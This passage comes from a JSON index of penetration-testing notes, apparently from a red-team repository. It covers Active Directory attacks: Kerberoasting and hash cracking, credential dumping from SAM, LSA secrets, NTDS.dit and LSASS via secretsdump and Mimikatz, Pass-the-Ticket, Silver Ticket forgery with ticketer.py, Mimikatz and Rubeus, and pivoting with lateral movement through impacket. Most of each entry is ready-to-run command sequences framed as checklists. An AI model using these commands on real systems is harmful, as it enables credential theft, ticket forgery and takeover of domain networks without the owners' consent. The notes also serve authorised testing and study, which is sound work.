Impacket\r\n\r\n```bash\r\nGetUserSPNs.py <DOMAIN.LOCAL>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request\r\n```\r\n\r\n### Using NTLM Hashes\r\n\r\n```bash\r\nGetUserSPNs.py -hashes :<NTLM_HASH> <DOMAIN.LOCAL>/<USER> -dc-ip <DC_IP> -request\r\n```\r\n\r\n### Using Kerberos Authentication\r\n\r\n```bash\r\nGetUserSPNs.py -k -no-pass <DOMAIN.LOCAL>/<USER> -dc-ip <DC_IP> -request\r\n```\r\n\r\n---\r\n\r\n## Crack Kerberoast Hashes\r\n\r\n### Hashcat\r\n\r\n```bash\r\nhashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt\r\n```\r\n\r\n### John the Ripper\r\n\r\n```bash\r\njohn --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt\r\n```\r\n\r\n## Checklist\r\n\r\n- [ ] Build a list of valid usernames.\r\n- [ ] Perform AS-REP Roasting.\r\n- [ ] Crack any recovered AS-REP hashes.\r\n- [ ] Retry with the `--downgrade` flag if necessary.\r\n- [ ] Obtain valid domain credentials.\r\n- [ ] Perform Kerberoasting against SPN accounts.\r\n- [ ] Crack recovered TGS hashes.\r\n- [ ] Test recovered credentials across SMB, LDAP, WinRM, MSSQL, and RDP.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "impacket",
      "hashcat",
      "winrm",
      "kerberoasting",
      "asreproast",
      "ldap",
      "smb",
      "kerberos",
      "rce"
    ],
    "size": 3531,
    "lineCount": 138
  },
  {
    "id": "ad-checklist-08-local-administrator-post-exploitation",
    "title": "Local Administrator Post-Exploitation",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/08. Local Administrator Post-Exploitation.md",
    "content": "# Local Administrator Post-Exploitation\r\n\r\n## Objective\r\n\r\nLeverage local administrator privileges to extract credentials, identify privilege escalation opportunities, enumerate Active Directory attack paths, and prepare for lateral movement or domain compromise.\r\n\r\n---\r\n\r\n# 1. Dump Local Credentials\r\n\r\n## Dump the SAM & SYSTEM Hives\r\n\r\n```cmd\r\nreg save HKLM\\SAM sam.save\r\n```\r\n\r\n```cmd\r\nreg save HKLM\\SYSTEM system.save\r\n```\r\n\r\nExtract local account hashes:\r\n\r\n```bash\r\nimpacket-secretsdump -sam sam.save -system system.save LOCAL\r\n```\r\n\r\n---\r\n\r\n## Dump LSA Secrets\r\n\r\nRecover cached credentials, service account passwords, machine account secrets, and DPAPI keys.\r\n\r\n```bash\r\nimpacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\n> **Look for:**\r\n>\r\n> - Cached credentials\r\n> - Service account passwords\r\n> - Machine account secrets\r\n> - DPAPI master keys\r\n\r\n---\r\n\r\n## Dump NTDS.dit (Domain Controller Only)\r\n\r\nIf the compromised host is a Domain Controller:\r\n\r\n```bash\r\nimpacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\nor\r\n\r\n```bash\r\nimpacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>\r\n```\r\n\r\n> Recover all domain account hashes for offline cracking or Pass-the-Hash attacks.\r\n\r\n---\r\n\r\n# 2. Extract Credentials from Memory\r\n\r\nUse Mimikatz to recover credentials stored in LSASS.\r\n\r\n```text\r\nprivilege::debug\r\nsekurlsa::logonpasswords\r\n```\r\n\r\nAdditional useful modules:\r\n\r\n```text\r\nsekurlsa::tickets\r\nsekurlsa::ekeys\r\nlsadump::lsa\r\n```\r\n\r\n> **Collect:**\r\n>\r\n> - Plaintext passwords\r\n> - NTLM hashes\r\n> - Kerberos tickets\r\n> - AES keys\r\n\r\n---\r\n\r\n# 3. Dump DPAPI Secrets\r\n\r\nDPAPI frequently contains reusable credentials.\r\n\r\n## SharpDPAPI\r\n\r\n```powershell\r\n.\\SharpDPAPI.exe triage\r\n```\r\n\r\nor\r\n\r\n```powershell\r\n.\\SharpDPAPI.exe credentials\r\n```\r\n\r\nRecover:\r\n\r\n- Browser credentials\r\n- Windows Credential Manager\r\n- Wi-Fi passwords\r\n- RDP credentials\r\n- Certificates\r\n\r\n---\r\n\r\n# 4. Collect & Crack Hashes\r\n\r\nCollect every recovered hash.\r\n\r\nSources include:\r\n\r\n- SAM\r\n- LSA Secrets\r\n- NTDS.dit\r\n- Mimikatz\r\n- Browser credentials\r\n- Cached credentials\r\n\r\nCrack recovered hashes whenever possible.\r\n\r\n```bash\r\nhashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt\r\n```\r\n\r\n> Plaintext passwords are generally more useful than NTLM hashes because some services do not support Pass-the-Hash authentication.\r\n\r\n---\r\n\r\n# 5. Validate Administrative Access\r\n\r\nDo not rely solely on `nxc` output.\r\n\r\nTest administrative access manually.\r\n\r\n```bash\r\nevil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>\r\n```\r\n\r\n```bash\r\nnxc winrm <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth\r\n```\r\n\r\n> **Note:** `nxc` may not always display `Pwn3d!` even when the supplied credentials have administrative privileges.\r\n\r\n---\r\n\r\n# 6. Re-Run Local Enumeration\r\n\r\nAdministrator privileges often expose new attack paths.\r\n\r\nRun:\r\n\r\n- WinPEAS\r\n- Seatbelt\r\n- SharpUp\r\n- PowerUp\r\n\r\nLook for:\r\n\r\n- Privilege escalation opportunities\r\n- Scheduled tasks\r\n- Weak service permissions\r\n- Credentials\r\n- DPAPI secrets\r\n\r\n---\r\n\r\n# 7. Collect Active Directory Data\r\n\r\nAfter obtaining administrator privileges on a domain-joined host, collect BloodHound data.\r\n\r\n```powershell\r\n.\\SharpHound.exe\r\n```\r\n\r\nor\r\n\r\n```powershell\r\nInvoke-BloodHound\r\n```\r\n\r\nImport the collected ZIP file into BloodHound and identify the next attack path.\r\n\r\n---\r\n\r\n# 8. Repeat Credential Hunting\r\n\r\nRepeat credential hunting with elevated privileges.\r\n\r\nCheck:\r\n\r\n- PowerShell history\r\n- Browser credentials\r\n- Registry credentials\r\n- AutoLogon credentials\r\n- User profiles\r\n- Scheduled tasks\r\n- Application configuration files\r\n- ProgramData\r\n- Hidden files\r\n\r\n---\r\n\r\n## PowerShell History\r\n\r\n```powershell\r\nforeach($user in (Get-ChildItem C:\\Users).FullName){Get-Content \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\r\n```\r\n\r\n---\r\n\r\n## AutoLogon Credentials\r\n\r\n```cmd\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\r\n```\r\n\r\nLook for:\r\n\r\n- `DefaultUserName`\r\n- `DefaultPassword`\r\n- `DefaultDomainName`\r\n\r\n---\r\n\r\n# 9. Continue Manual Enumeration\r\n\r\nInspect:\r\n\r\n- `C:\\Users`\r\n- `C:\\ProgramData`\r\n- `C:\\Program Files`\r\n- `C:\\Program Files (x86)`\r\n- IIS directories\r\n- XAMPP\r\n- Scheduled Tasks\r\n- Backup folders\r\n- Database files\r\n- Configuration files\r\n- Hidden directories\r\n\r\nAdministrator access often reveals credentials unavailable to standard users.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Dump SAM and SYSTEM immediately after obtaining local administrator access.\r\n- Dump LSA secrets and DPAPI credentials.\r\n- Dump NTDS.dit if the host is a Domain Controller.\r\n- Run Mimikatz to recover plaintext credentials and Kerberos tickets.\r\n- Re-run WinPEAS after privilege escalation.\r\n- Collect BloodHound data from every compromised domain-joined host.\r\n- Crack recovered hashes whenever practical.\r\n- Always validate administrative access manually—don't rely solely on `nxc`.\r\n- Revisit every credential hunting location after privilege escalation.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Dump SAM and SYSTEM.\r\n- [ ] Dump LSA secrets.\r\n- [ ] Dump NTDS.dit (if Domain Controller).\r\n- [ ] Run Mimikatz (`sekurlsa::logonpasswords`).\r\n- [ ] Dump DPAPI secrets.\r\n- [ ] Collect and crack recovered hashes.\r\n- [ ] Validate administrator access manually.\r\n- [ ] Re-run WinPEAS.\r\n- [ ] Run SharpHound.\r\n- [ ] Check PowerShell history.\r\n- [ ] Check AutoLogon credentials.\r\n- [ ] Repeat credential hunting with administrator privileges.\r\n- [ ] Continue manual enumeration of the filesystem.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "bloodhound",
      "impacket",
      "hashcat",
      "winrm",
      "pass-the-hash",
      "winpeas",
      "kerberos",
      "rce",
      "lateral movement"
    ],
    "size": 5558,
    "lineCount": 285
  },
  {
    "id": "ad-checklist-11-kerberos-attacks-pass-the-ticket-scenario",
    "title": "Pass-the-ticket Scenario",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist / 11. Kerberos Attacks",
    "filePath": "AD-Checklist/11. Kerberos Attacks/Pass-the-ticket Scenario.md",
    "content": "# Pass-the-Ticket (PTT)\r\n\r\n## Objective\r\n\r\nPass-the-Ticket (PTT) is a Kerberos authentication technique where a **valid Kerberos ticket** (TGT or TGS) is injected into a session to authenticate without knowing the user's password or NTLM hash.\r\n\r\nUnlike Pass-the-Hash, PTT reuses **legitimate Kerberos tickets** instead of NTLM credentials.\r\n\r\n---\r\n\r\n# When to Use Pass-the-Ticket\r\n\r\nPTT is useful when you have access to a valid Kerberos ticket but do not know the account's password.\r\n\r\nCommon scenarios include:\r\n\r\n- Compromised Windows host with logged-in users.\r\n- Service account running under a domain account.\r\n- WinRM shell on a domain-joined machine.\r\n- RDP session.\r\n- IIS Application Pool running as a domain account.\r\n- SQL Server service account.\r\n- Scheduled Tasks using domain credentials.\r\n- Backup software running under a domain account.\r\n- Tickets exported from Mimikatz or Rubeus.\r\n- `.ccache` files obtained from Linux.\r\n- `.kirbi` files obtained from Windows.\r\n\r\n---\r\n\r\n# Kerberos Ticket Types\r\n\r\n## TGT (Ticket Granting Ticket)\r\n\r\nIssued after user authentication.\r\n\r\nUsed to request service tickets.\r\n\r\nCan authenticate to any service the user is authorized for.\r\n\r\n---\r\n\r\n## TGS (Service Ticket)\r\n\r\nIssued for a specific service.\r\n\r\nExamples:\r\n\r\n- CIFS\r\n- HTTP\r\n- MSSQL\r\n- LDAP\r\n- HOST\r\n- WSMAN\r\n\r\nCan only authenticate to the specified service.\r\n\r\n---\r\n\r\n# Enumerate Existing Tickets\r\n\r\n## Windows\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\n---\r\n\r\n## Mimikatz\r\n\r\n```text\r\nsekurlsa::tickets\r\n```\r\n\r\n---\r\n\r\n## Rubeus\r\n\r\n```powershell\r\nRubeus.exe triage\r\n```\r\n\r\n---\r\n\r\n# Scenario 1 - Logged-in User\r\n\r\nA privileged user is logged onto the compromised workstation.\r\n\r\nDump tickets.\r\n\r\n## Mimikatz\r\n\r\n```text\r\nsekurlsa::tickets /export\r\n```\r\n\r\n## Rubeus\r\n\r\n```powershell\r\nRubeus.exe dump\r\n```\r\n\r\nInject the ticket.\r\n\r\n```text\r\nkerberos::ptt Administrator.kirbi\r\n```\r\n\r\nVerify.\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Scenario 2 - Service Account Ticket\r\n\r\nA service such as SQL Server, IIS, Exchange, Backup Software or Scheduled Task runs under a domain account.\r\n\r\nExample:\r\n\r\n```\r\nsvc_sql\r\nsvc_backup\r\nsvc_web\r\n```\r\n\r\nExtract tickets.\r\n\r\n```powershell\r\nRubeus.exe dump\r\n```\r\n\r\nor\r\n\r\n```text\r\nsekurlsa::tickets /export\r\n```\r\n\r\nInject.\r\n\r\n```text\r\nkerberos::ptt svc_sql.kirbi\r\n```\r\n\r\nAccess the permitted service.\r\n\r\n---\r\n\r\n# Scenario 3 - WinRM Shell\r\n\r\nYou compromise a machine using WinRM.\r\n\r\nA different user has already authenticated.\r\n\r\nDump tickets.\r\n\r\n```text\r\nsekurlsa::tickets\r\n```\r\n\r\nInject desired ticket.\r\n\r\n```text\r\nkerberos::ptt administrator.kirbi\r\n```\r\n\r\nVerify.\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Scenario 4 - RDP Session\r\n\r\nAn administrator is logged into the target.\r\n\r\nDump tickets from LSASS.\r\n\r\nInject.\r\n\r\nReuse the Administrator ticket.\r\n\r\n---\r\n\r\n# Scenario 5 - Kerberoast but Cannot Crack\r\n\r\nYou recover a Kerberoast hash.\r\n\r\n```\r\nsvc_mssql\r\n```\r\n\r\nThe password cannot be cracked.\r\n\r\nLater, you compromise another machine where **svc_mssql** is running as a service.\r\n\r\nDump Kerberos tickets.\r\n\r\n```powershell\r\nRubeus.exe dump\r\n```\r\n\r\nor\r\n\r\n```text\r\nsekurlsa::tickets /export\r\n```\r\n\r\nInject the service ticket.\r\n\r\n```text\r\nkerberos::ptt svc_mssql.kirbi\r\n```\r\n\r\nAuthenticate to resources permitted for **svc_mssql**.\r\n\r\n> **Note:** The Kerberoast hash itself is **not** used for authentication. The live Kerberos ticket is extracted from memory and reused.\r\n\r\n---\r\n\r\n# Scenario 6 - Linux (.ccache)\r\n\r\nA Kerberos cache file is recovered.\r\n\r\n```\r\nAdministrator.ccache\r\n```\r\n\r\nLoad the cache.\r\n\r\n```bash\r\nexport KRB5CCNAME=Administrator.ccache\r\n```\r\n\r\nVerify.\r\n\r\n```bash\r\nklist\r\n```\r\n\r\nUse Kerberos authentication.\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>\r\n```\r\n\r\n---\r\n\r\n# Scenario 7 - Recovered .kirbi File\r\n\r\nA ticket file is discovered during post-exploitation.\r\n\r\nExamples:\r\n\r\n- Downloads\r\n- Desktop\r\n- Temp directory\r\n- Backup\r\n- Exported by another operator\r\n\r\nInject.\r\n\r\n```text\r\nkerberos::ptt ticket.kirbi\r\n```\r\n\r\n---\r\n\r\n# Export Tickets\r\n\r\n## Mimikatz\r\n\r\n```text\r\nsekurlsa::tickets /export\r\n```\r\n\r\n---\r\n\r\n## Rubeus\r\n\r\n```powershell\r\nRubeus.exe dump\r\n```\r\n\r\n---\r\n\r\n# Inject Tickets\r\n\r\n## Mimikatz\r\n\r\n```text\r\nkerberos::ptt ticket.kirbi\r\n```\r\n\r\n---\r\n\r\n## Rubeus\r\n\r\n```powershell\r\nRubeus.exe ptt /ticket:ticket.kirbi\r\n```\r\n\r\n---\r\n\r\n# Linux Usage\r\n\r\nLoad cache.\r\n\r\n```bash\r\nexport KRB5CCNAME=ticket.ccache\r\n```\r\n\r\nVerify.\r\n\r\n```bash\r\nklist\r\n```\r\n\r\nExamples.\r\n\r\nSMB\r\n\r\n```bash\r\nimpacket-smbclient -k -no-pass //<TARGET>/C$\r\n```\r\n\r\nPsExec\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>\r\n```\r\n\r\nWMI\r\n\r\n```bash\r\nimpacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET>\r\n```\r\n\r\nSMBExec\r\n\r\n```bash\r\nimpacket-smbexec -k -no-pass <DOMAIN>/<USER>@<TARGET>\r\n```\r\n\r\nMSSQL\r\n\r\n```bash\r\nimpacket-mssqlclient -k -no-pass <TARGET>\r\n```\r\n\r\nLDAP\r\n\r\n```bash\r\nldapsearch -Y GSSAPI ...\r\n```\r\n\r\n---\r\n\r\n# Verify Ticket\r\n\r\nWindows\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\nLinux\r\n\r\n```bash\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Cleanup\r\n\r\nWindows\r\n\r\n```cmd\r\nklist purge\r\n```\r\n\r\nor\r\n\r\n```text\r\nkerberos::purge\r\n```\r\n\r\nLinux\r\n\r\n```bash\r\nunset KRB5CCNAME\r\n```\r\n\r\n---\r\n\r\n# Tips\r\n\r\n- Always enumerate Kerberos tickets after obtaining a shell.\r\n- Check every logged-in user.\r\n- Service accounts frequently have reusable tickets.\r\n- Scheduled Tasks often leave Kerberos tickets in memory.\r\n- SQL Server and IIS commonly run under privileged domain accounts.\r\n- A Kerberoast hash cannot be used directly for Pass-the-Ticket.\r\n- If Kerberoasting fails because the password cannot be cracked, look for the same service account running elsewhere and extract its live ticket.\r\n- Save every `.kirbi` and `.ccache` file you recover.\r\n- Verify injected tickets with `klist` before attempting authentication.\r\n\r\n---\r\n\r\n# Checklist\r\n\r\n- [ ] Enumerate Kerberos tickets.\r\n- [ ] Identify privileged users.\r\n- [ ] Export TGTs and TGS tickets.\r\n- [ ] Inject recovered tickets.\r\n- [ ] Verify ticket injection.\r\n- [ ] Authenticate using Kerberos.\r\n- [ ] Check service account tickets.\r\n- [ ] Check WinRM and RDP sessions.\r\n- [ ] Check scheduled tasks and service accounts.\r\n- [ ] Save all `.kirbi` and `.ccache` files.\r\n- [ ] Purge tickets after testing.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "mimikatz",
      "rubeus",
      "impacket",
      "psexec",
      "winrm",
      "kerberoasting",
      "pass-the-ticket",
      "pass-the-hash",
      "ldap",
      "smb",
      "kerberos",
      "rce"
    ],
    "size": 6146,
    "lineCount": 429
  },
  {
    "id": "ad-checklist-12-pivoting-lateral-movement",
    "title": "Pivoting & Lateral Movement",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist",
    "filePath": "AD-Checklist/12. Pivoting & Lateral Movement.md",
    "content": "# Pivoting & Lateral Movement\r\n\r\n## Objective\r\n\r\nPivot into inaccessible network segments, enumerate newly discovered hosts, validate recovered credentials, and move laterally throughout the Active Directory environment.\r\n\r\n---\r\n\r\n# 1. Network Discovery\r\n\r\nDetermine whether additional internal networks are reachable.\r\n\r\nCheck:\r\n\r\n- Additional network adapters\r\n- VPN interfaces\r\n- Hyper-V adapters\r\n- Docker networks\r\n- Multiple subnets\r\n- Static routes\r\n\r\nWindows:\r\n\r\n```cmd\r\nipconfig /all\r\n```\r\n\r\n```cmd\r\nroute print\r\n```\r\n\r\nLinux:\r\n\r\n```bash\r\nip addr\r\n```\r\n\r\n```bash\r\nip route\r\n```\r\n\r\n> Multiple network interfaces often indicate additional internal segments that require pivoting.\r\n\r\n---\r\n\r\n# 2. Network Pivoting\r\n\r\nIf the compromised host has access to another subnet, establish a pivot.\r\n\r\n## Ligolo-ng\r\n\r\nStart the proxy.\r\n\r\n```bash\r\nproxy\r\n```\r\n\r\nStart the agent.\r\n\r\n```bash\r\nagent\r\n```\r\n\r\nAdd a route to the newly discovered subnet.\r\n\r\nExample:\r\n\r\n```bash\r\nsudo ip route add 192.168.240.0/24 dev ligolo\r\n```\r\n\r\n> Replace the subnet with the newly discovered network.\r\n\r\n---\r\n\r\n# 3. Enumerate Through the Pivot\r\n\r\nAfter routing traffic through the tunnel, enumerate the new network.\r\n\r\nHost discovery:\r\n\r\n```bash\r\nnmap -sn 192.168.240.0/24\r\n```\r\n\r\nPort scan:\r\n\r\n```bash\r\nnmap -Pn -sV -p- 192.168.240.0/24\r\n```\r\n\r\nContinue enumeration as if directly connected.\r\n\r\n---\r\n\r\n# 4. Validate Every Credential\r\n\r\nWhenever new credentials are recovered:\r\n\r\n- Test every discovered host.\r\n- Test every accessible protocol.\r\n- Test local authentication.\r\n\r\nNever assume credentials only work on the machine where they were found.\r\n\r\n---\r\n\r\n# 5. Password Spraying\r\n\r\nSpray recovered passwords across the environment when permitted by the engagement scope.\r\n\r\nCommon targets:\r\n\r\n- SMB\r\n- WinRM\r\n- RDP\r\n- LDAP\r\n- MSSQL\r\n- SSH\r\n\r\nUse:\r\n\r\n- `nxc`\r\n\r\nAlways consider account lockout policies.\r\n\r\n---\r\n\r\n# 6. Pass-the-Hash\r\n\r\nWhenever NTLM hashes are recovered:\r\n\r\nTest:\r\n\r\n- SMB\r\n- WinRM\r\n- PsExec\r\n- WMIExec\r\n- SMBExec\r\n\r\nHashes frequently work across multiple hosts due to administrator password reuse.\r\n\r\n---\r\n\r\n# 7. Test Local Authentication\r\n\r\nNever forget local authentication.\r\n\r\n```bash\r\nnxc smb <TARGET> -u <USER> -p <PASSWORD> --local-auth\r\n```\r\n\r\nPassword reuse among local administrator accounts is common.\r\n\r\n---\r\n\r\n# 8. Switch User Context\r\n\r\nIf valid credentials are discovered but remote logon is not permitted, execute processes as another user.\r\n\r\nExample:\r\n\r\n```cmd\r\nRunasCs.exe <DOMAIN>\\<USER> <PASSWORD> whoami\r\n```\r\n\r\nor\r\n\r\n```cmd\r\nRunasCs.exe <DOMAIN>\\<USER> <PASSWORD> cmd.exe\r\n```\r\n\r\nUseful for validating credentials before attempting lateral movement.\r\n\r\n---\r\n\r\n# 9. Test Every Protocol\r\n\r\nRecovered credentials should be tested against every exposed service.\r\n\r\nCheck:\r\n\r\n- SMB\r\n- WinRM\r\n- LDAP\r\n- MSSQL\r\n- SSH\r\n- FTP\r\n- RDP\r\n- HTTP applications\r\n\r\nDifferent services frequently enforce different authentication mechanisms.\r\n\r\n---\r\n\r\n# 10. Target High-Value Systems\r\n\r\nDo not focus solely on Domain Controllers.\r\n\r\nHigh-value targets often include:\r\n\r\n- Database servers\r\n- File servers\r\n- Backup servers\r\n- Certificate servers\r\n- SQL Servers\r\n- Exchange servers\r\n- SCCM servers\r\n- Application servers\r\n- Jump hosts\r\n\r\nThese systems frequently contain sensitive credentials or business data without requiring Domain Admin privileges.\r\n\r\n---\r\n\r\n# 11. Re-Enumerate\r\n\r\nEvery successful compromise should trigger another round of enumeration.\r\n\r\nRepeat:\r\n\r\n- BloodHound\r\n- SMB enumeration\r\n- Session enumeration\r\n- Credential hunting\r\n- Privilege escalation\r\n- Network discovery\r\n\r\nNew privileges often reveal additional attack paths.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Always check for additional network interfaces after obtaining a shell.\r\n- Pivot before assuming a network is inaccessible.\r\n- Reuse every recovered credential across all discovered hosts.\r\n- Never forget `--local-auth`.\r\n- Test passwords before hashes whenever both are available.\r\n- Valuable data often resides on file servers and database servers—not only Domain Controllers.\r\n- Re-run BloodHound after every successful lateral movement.\r\n- Validate credentials manually if automated tools produce unexpected results.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Enumerate network interfaces.\r\n- [ ] Identify additional subnets.\r\n- [ ] Establish a Ligolo-ng pivot.\r\n- [ ] Add routes to newly discovered networks.\r\n- [ ] Scan through the pivot.\r\n- [ ] Validate recovered credentials.\r\n- [ ] Perform password spraying.\r\n- [ ] Perform Pass-the-Hash.\r\n- [ ] Test local authentication.\r\n- [ ] Switch user context with RunasCs when appropriate.\r\n- [ ] Test every protocol.\r\n- [ ] Target high-value systems.\r\n- [ ] Re-enumerate after every successful compromise.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "nmap",
      "bloodhound",
      "ligolo",
      "psexec",
      "winrm",
      "pass-the-hash",
      "ldap",
      "smb",
      "rce",
      "lateral movement",
      "sudo"
    ],
    "size": 4723,
    "lineCount": 261
  },
  {
    "id": "ad-checklist-11-kerberos-attacks-silver-ticket",
    "title": "Silver Ticket",
    "category": "Active Directory & Kerberos",
    "subcategory": "AD-Checklist / 11. Kerberos Attacks",
    "filePath": "AD-Checklist/11. Kerberos Attacks/Silver Ticket.md",
    "content": "# Silver Ticket Attack\r\n\r\n## Objective\r\n\r\nA **Silver Ticket** is a forged Kerberos **Ticket Granting Service (TGS)** ticket that grants access to a **specific service** on a target system without contacting the Domain Controller (KDC).\r\n\r\nUnlike a Golden Ticket, a Silver Ticket is valid **only for the targeted service**, making it stealthier and more difficult to detect.\r\n\r\n---\r\n\r\n# Requirements\r\n\r\nBefore creating a Silver Ticket, you need:\r\n\r\n- Domain SID\r\n- Service Account NTLM hash **or** AES128/AES256 key\r\n- Target service SPN\r\n- Target hostname/FQDN\r\n- Username to impersonate (commonly `Administrator`)\r\n\r\n---\r\n\r\n# Common Service SPNs\r\n\r\n| Service | SPN | Authorized Access Gained | Verification |\r\n|---------|-----|--------------------------|-------------|\r\n| SMB | `cifs` | File shares, administrative shares | `dir \\\\target\\C$` |\r\n| WinRM | `wsman` | PowerShell Remoting | `Enter-PSSession -ComputerName target` |\r\n| HTTP | `http` | IIS / Web applications | Browse web application |\r\n| LDAP | `ldap` | Active Directory LDAP queries | `ldapsearch` |\r\n| MSSQL | `mssqlsvc` | SQL Server access | `impacket-mssqlclient` |\r\n| HOST | `host` | Miscellaneous host services | Depends on service |\r\n| RPC | `rpcss` | RPC services | RPC tools |\r\n| Exchange | `exchangeMDB` | Exchange mailbox services | Exchange tools |\r\n| DNS | `dns` | DNS services | DNS queries |\r\n| RDP | `termsrv` | Remote Desktop | `mstsc` |\r\n\r\n---\r\n\r\n# Collect Required Information\r\n\r\n## Domain SID\r\n\r\n### Windows\r\n\r\n```cmd\r\nwhoami /user\r\n```\r\n\r\n### Linux\r\n\r\n```bash\r\nimpacket-lookupsid <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>\r\n```\r\n\r\n---\r\n\r\n## Service Account Hash\r\n\r\nCommon methods:\r\n\r\n- Kerberoasting\r\n- secretsdump.py\r\n- Mimikatz\r\n- DCSync\r\n- LSA Secrets\r\n\r\nExample:\r\n\r\n```text\r\nsvc_sql:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808\r\n```\r\n\r\n---\r\n\r\n# Create a Silver Ticket (Linux)\r\n\r\n## Using NTLM Hash\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn cifs/<TARGET_FQDN> Administrator\r\n```\r\n\r\n## Using AES128 Key\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES128_KEY> -spn cifs/<TARGET_FQDN> Administrator\r\n```\r\n\r\n## Using AES256 Key\r\n\r\n```bash\r\nticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES256_KEY> -spn cifs/<TARGET_FQDN> Administrator\r\n```\r\n\r\nOutput:\r\n\r\n```text\r\nAdministrator.ccache\r\n```\r\n\r\n---\r\n\r\n# Use the Silver Ticket (Linux)\r\n\r\nLoad the generated Kerberos cache.\r\n\r\n```bash\r\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\r\n```\r\n\r\nVerify the ticket.\r\n\r\n```bash\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Authenticate Using the Silver Ticket (Linux)\r\n\r\n## SMB\r\n\r\n```bash\r\nimpacket-smbclient -k -no-pass //<TARGET_FQDN>/C$\r\n```\r\n\r\n## PsExec\r\n\r\n```bash\r\nimpacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>\r\n```\r\n\r\n## WMIExec\r\n\r\n```bash\r\nimpacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>\r\n```\r\n\r\n## SMBExec\r\n\r\n```bash\r\nimpacket-smbexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>\r\n```\r\n\r\n## MSSQL\r\n\r\n```bash\r\nimpacket-mssqlclient -k -no-pass <TARGET_FQDN>\r\n```\r\n\r\n---\r\n\r\n# Create a Silver Ticket (Windows)\r\n\r\n## Mimikatz (RC4 / NTLM)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<NTLM_HASH> /user:Administrator /ptt\r\n```\r\n\r\n## Mimikatz (AES128)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /aes128:<AES128_KEY> /user:Administrator /ptt\r\n```\r\n\r\n## Mimikatz (AES256)\r\n\r\n```text\r\nkerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /aes256:<AES256_KEY> /user:Administrator /ptt\r\n```\r\n\r\n> **Note:** Mimikatz uses the `kerberos::golden` command to forge both **Golden** and **Silver** Tickets. Supplying the `/service` and `/target` parameters creates a **Silver Ticket**.\r\n\r\n---\r\n\r\n# Create a Silver Ticket (Rubeus)\r\n\r\n## RC4 / NTLM\r\n\r\n```powershell\r\nRubeus.exe silver /service:cifs/<TARGET_FQDN> /rc4:<NTLM_HASH> /sid:<DOMAIN_SID> /domain:<DOMAIN> /user:Administrator /ptt\r\n```\r\n\r\n## AES256\r\n\r\n```powershell\r\nRubeus.exe silver /service:cifs/<TARGET_FQDN> /aes256:<AES256_KEY> /sid:<DOMAIN_SID> /domain:<DOMAIN> /user:Administrator /ptt\r\n```\r\n\r\n---\r\n\r\n# Verify the Ticket\r\n\r\nWindows:\r\n\r\n```cmd\r\nklist\r\n```\r\n\r\nLinux:\r\n\r\n```bash\r\nklist\r\n```\r\n\r\n---\r\n\r\n# Verify Service Access\r\n\r\n## SMB\r\n\r\n```cmd\r\ndir \\\\<TARGET_FQDN>\\C$\r\n```\r\n\r\n## WinRM\r\n\r\n```powershell\r\nEnter-PSSession -ComputerName <TARGET_FQDN>\r\n```\r\n\r\n## RDP\r\n\r\n```cmd\r\nmstsc /v:<TARGET_FQDN>\r\n```\r\n\r\n## MSSQL\r\n\r\n```bash\r\nimpacket-mssqlclient -k -no-pass <TARGET_FQDN>\r\n```\r\n\r\n---\r\n\r\n# Cleanup\r\n\r\n## Windows (Mimikatz)\r\n\r\n```text\r\nkerberos::purge\r\n```\r\n\r\n## Windows\r\n\r\n```cmd\r\nklist purge\r\n```\r\n\r\n## Linux\r\n\r\n```bash\r\nunset 